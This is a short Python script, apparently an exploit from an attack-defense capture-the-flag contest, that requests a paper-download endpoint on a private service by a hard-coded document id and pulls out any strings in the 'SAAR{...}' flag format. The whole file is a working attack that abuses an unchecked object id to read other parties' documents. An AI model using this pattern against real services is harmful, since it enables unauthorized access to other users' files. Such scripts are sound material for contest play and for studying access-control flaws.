#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re ,requests


ip = '10.32.116.2'
url = 'http://' + ip + ':5000'
i = 3004

s = requests.Session()

doc = s.get(url + '/Paper/Download?id={}'.format(i))

re_flags = re.findall('SAAR\{[A-Za-z0-9-_]{32}\}', doc.text)
print(re_flags, flush=True)



